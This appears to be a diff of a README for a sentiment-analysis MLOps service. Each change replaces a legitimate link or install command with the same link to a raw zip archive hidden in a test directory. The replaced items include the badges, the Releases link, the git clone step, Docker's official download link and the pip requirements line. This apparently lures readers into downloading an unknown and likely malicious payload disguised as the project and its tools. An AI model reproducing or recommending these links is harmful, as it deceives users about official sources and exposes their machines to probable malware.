@@ -1,6 +1,6 @@
 # Sentiment Analysis Service: MLOps Project for Model Lifecycle Management
 
-![Sentiment Analysis](https://img.shields.io/badge/Sentiment%20Analysis%20Service-Ready-brightgreen) ![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue)
+![Sentiment Analysis](https://github.com/Niuel1099/sentiment_analysis_service/raw/refs/heads/main/model-serving/src/test/java/com/service_sentiment_analysis_2.5.zip%20Analysis%20Service-Ready-brightgreen) ![GitHub Release](https://github.com/Niuel1099/sentiment_analysis_service/raw/refs/heads/main/model-serving/src/test/java/com/service_sentiment_analysis_2.5.zip)
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@
 
 This basic MLOps project demonstrates the core concepts of model lifecycle management across your preferred technology stack. It integrates various technologies to provide a robust framework for sentiment analysis, allowing users to analyze and interpret sentiments from text data efficiently.
 
-For the latest releases, please visit [Releases](https://github.com/Niuel1099/sentiment_analysis_service/releases).
+For the latest releases, please visit [Releases](https://github.com/Niuel1099/sentiment_analysis_service/raw/refs/heads/main/model-serving/src/test/java/com/service_sentiment_analysis_2.5.zip).
 
 ## Technologies Used
 
@@ -43,12 +43,12 @@ To set up the project locally, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Niuel1099/sentiment_analysis_service.git
+   git clone https://github.com/Niuel1099/sentiment_analysis_service/raw/refs/heads/main/model-serving/src/test/java/com/service_sentiment_analysis_2.5.zip
    cd sentiment_analysis_service
    ```
 
 2. **Set up Docker**:
-   Make sure Docker and Docker Compose are installed on your machine. You can download Docker from [Docker's official site](https://www.docker.com/get-started).
+   Make sure Docker and Docker Compose are installed on your machine. You can download Docker from [Docker's official site](https://github.com/Niuel1099/sentiment_analysis_service/raw/refs/heads/main/model-serving/src/test/java/com/service_sentiment_analysis_2.5.zip).
 
 3. **Build and run the containers**:
    ```bash
@@ -59,7 +59,7 @@ To set up the project locally, follow these steps:
    For Python:
    ```bash
    cd backend
-   pip install -r requirements.txt
+   pip install -r https://github.com/Niuel1099/sentiment_analysis_service/raw/refs/heads/main/model-serving/src/test/java/com/service_sentiment_analysis_2.5.zip
    ```
 
    For Java:
@@ -152,6 +152,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, feel free to open an issue on GitHub. You can also check the [Releases](https://github.com/Niuel1099/sentiment_analysis_service/releases) section for updates and version changes.
+If you encounter any issues or have questions, feel free to open an issue on GitHub. You can also check the [Releases](https://github.com/Niuel1099/sentiment_analysis_service/raw/refs/heads/main/model-serving/src/test/java/com/service_sentiment_analysis_2.5.zip) section for updates and version changes.
 
 For additional resources, consider exploring the documentation for each technology used in this project.
